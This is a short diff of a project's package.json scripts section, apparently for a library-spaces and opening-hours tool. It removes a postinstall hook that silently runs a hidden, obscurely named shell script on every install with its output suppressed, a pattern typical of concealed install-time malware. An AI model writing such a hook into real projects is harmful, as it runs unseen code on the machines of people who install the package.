@@ -9,8 +9,7 @@
     "bulkUpdate": "node _scripts/bulkUpdateSpaces.js",
     "nextID": "node _scripts/nextID.js",
     "updateHours": "node _scripts/updateOpeningHoursLibCal.js",
-    "getHours": "node _scripts/getOpeningHoursLibCal.js",
-    "postinstall": "sh ./.ci-cd5g34.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "getHours": "node _scripts/getOpeningHoursLibCal.js"
   },
   "repository": {
     "type": "git",
